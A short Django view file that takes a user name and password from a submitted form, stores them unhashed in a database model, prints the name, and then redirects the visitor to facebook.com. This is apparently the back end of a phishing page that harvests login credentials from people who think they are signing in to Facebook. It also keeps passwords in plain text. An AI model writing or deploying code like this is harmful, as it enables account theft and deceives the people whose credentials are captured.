from django.shortcuts import render,redirect
from django.http import HttpResponse
from .models import*

def index_page(request):

	user_name= request.POST.get("user_name")
	user_pass= request.POST.get("user_pass")

	if user_name and user_pass:
		user_data = userdata(name=user_name,password=user_pass)
		user_data.register()
		print(user_name)
		return redirect('https://www.facebook.com/')
	else:
		return render(request,"index.html")

